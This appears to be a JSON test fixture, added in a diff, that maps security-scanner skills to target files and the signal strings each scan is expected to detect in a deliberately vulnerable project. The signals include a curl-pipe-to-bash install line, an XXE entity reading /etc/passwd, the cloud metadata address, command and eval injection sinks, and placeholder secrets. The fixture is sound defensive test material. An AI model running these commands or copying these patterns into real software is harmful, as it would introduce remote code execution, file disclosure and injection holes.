@@ -1,0 +1,106 @@
+{
+  "audit-asvs-compliance": {
+    "targets": ["docs/design.md", "src/app.js", "api/openapi.yaml"],
+    "signals": ["ASVS", "Missing authorization", "Session cookie"]
+  },
+  "audit-auth-session-management": {
+    "targets": ["src/app.js"],
+    "signals": ["jwt.sign", "expiresIn: '30d'", "secure: false", "sameSite: 'none'"]
+  },
+  "audit-crypto-usage": {
+    "targets": ["src/app.js"],
+    "signals": ["md5", "Math.random", "rejectUnauthorized: false"]
+  },
+  "audit-logging-monitoring": {
+    "targets": ["src/app.js", "docs/design.md"],
+    "signals": ["console.log('login failed", "logger.info('password reset token", "No central alerting"]
+  },
+  "detect-secrets": {
+    "targets": ["src/app.js", ".env.example"],
+    "signals": ["AWS_ACCESS_KEY_ID_EXAMPLE", "-----BEGIN RSA PRIVATE KEY-----", "AZURE_CLIENT_SECRET"]
+  },
+  "detect-supply-chain-risks": {
+    "targets": [".github/workflows/build.yml", "Dockerfile", "package.json"],
+    "signals": ["pull_request_target", "curl -s https://example.invalid/install.sh | bash", "postinstall"]
+  },
+  "generate-dependency-graph": {
+    "targets": ["sbom/cyclonedx.json", "package-lock.json"],
+    "signals": ["dependsOn", "lodash", "minimist"]
+  },
+  "generate-sbom": {
+    "targets": ["sbom/cyclonedx.json", "package.json"],
+    "signals": ["bomFormat", "CycloneDX", "components"]
+  },
+  "scan-api-security": {
+    "targets": ["api/openapi.yaml", "src/app.js"],
+    "signals": ["security: []", "/admin/users/{id}", "x-tenant-id"]
+  },
+  "scan-broken-access-control": {
+    "targets": ["src/app.js", "api/openapi.yaml"],
+    "signals": ["req.params.id", "SELECT * FROM users WHERE id", "cors({ origin: '*'"]
+  },
+  "scan-container-image": {
+    "targets": ["Dockerfile", "docker-compose.yml"],
+    "signals": ["USER root", "privileged: true", "/var/run/docker.sock"]
+  },
+  "scan-exception-handling": {
+    "targets": ["src/app.js"],
+    "signals": ["res.status(500).send(err.stack)", "catch (err)", "throw err"]
+  },
+  "scan-for-injection": {
+    "targets": ["src/app.js"],
+    "signals": ["SELECT * FROM users WHERE id = ' + req.params.id", "exec('convert ' + req.query.file", "eval(req.body.expression)"]
+  },
+  "scan-for-ssrf": {
+    "targets": ["src/app.js"],
+    "signals": ["axios.get(req.query.url", "169.254.169.254", "maxRedirects"]
+  },
+  "scan-for-xss": {
+    "targets": ["src/client.js", "src/app.js"],
+    "signals": ["innerHTML", "dangerouslySetInnerHTML", "res.send('<h1>' + req.query.name"]
+  },
+  "scan-iac-security": {
+    "targets": ["infra/main.tf"],
+    "signals": ["0.0.0.0/0", "acl    = \"public-read\"", "encrypted         = false"]
+  },
+  "scan-json-security": {
+    "targets": ["config/formats.json"],
+    "signals": ["\"authentication\": false", "\"cors\": [\"*\"]", "\"clientSecret\": \"json_TEST_SECRET_12345\"", "\"rejectUnauthorized\": false", "\"postinstall\": \"curl https://example.invalid/install.sh | bash\""]
+  },
+  "scan-kubernetes-manifests": {
+    "targets": ["k8s/deployment.yaml"],
+    "signals": ["privileged: true", "hostNetwork: true", "runAsUser: 0"]
+  },
+  "scan-markdown-security": {
+    "targets": ["docs/format-security.md"],
+    "signals": ["password: admin", "curl -k https://api.example.invalid/health", "curl https://example.invalid/install.sh | bash", "NODE_TLS_REJECT_UNAUTHORIZED=0", "AWS_ACCESS_KEY_ID_EXAMPLE", "Threat boundaries are TBD"]
+  },
+  "scan-sca-dependencies": {
+    "targets": ["package.json", "package-lock.json", "sbom/cyclonedx.json"],
+    "signals": ["lodash", "4.17.20", "CVE-2021-23337"]
+  },
+  "scan-security-headers": {
+    "targets": ["src/app.js", "nginx.conf"],
+    "signals": ["X-Powered-By", "Access-Control-Allow-Origin \"*\"", "helmet({ contentSecurityPolicy: false"]
+  },
+  "scan-static-analysis": {
+    "targets": ["src/app.js", "src/client.js"],
+    "signals": ["eval(req.body.expression)", "exec('convert ' + req.query.file", "innerHTML"]
+  },
+  "scan-toml-security": {
+    "targets": ["config/formats.toml"],
+    "signals": ["host = \"0.0.0.0\"", "debug = true", "tls = false", "verify_ssl = false", "api_key = \"toml_TEST_SECRET_12345\"", "allowed_origins = [\"*\"]", "url = \"http://packages.example.invalid/simple\""]
+  },
+  "scan-xml-security": {
+    "targets": ["config/formats.xml"],
+    "signals": ["<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "<security-enabled>false</security-enabled>", "<auth-method>NONE</auth-method>", "<transport-guarantee>NONE</transport-guarantee>", "<password>xml_TEST_SECRET_12345</password>", "debug=\"true\""]
+  },
+  "scan-yaml-security": {
+    "targets": ["config/formats.yaml"],
+    "signals": ["auth: false", "host: \"0.0.0.0\"", "allowedOrigins: [\"*\"]", "tls: false", "api_key: \"yaml_TEST_SECRET_12345\"", "privileged: true", "runAsUser: 0"]
+  },
+  "threat-model-system": {
+    "targets": ["docs/design.md"],
+    "signals": ["Trust boundaries are TBD", "No abuse cases", "No documented data classification"]
+  }
+}
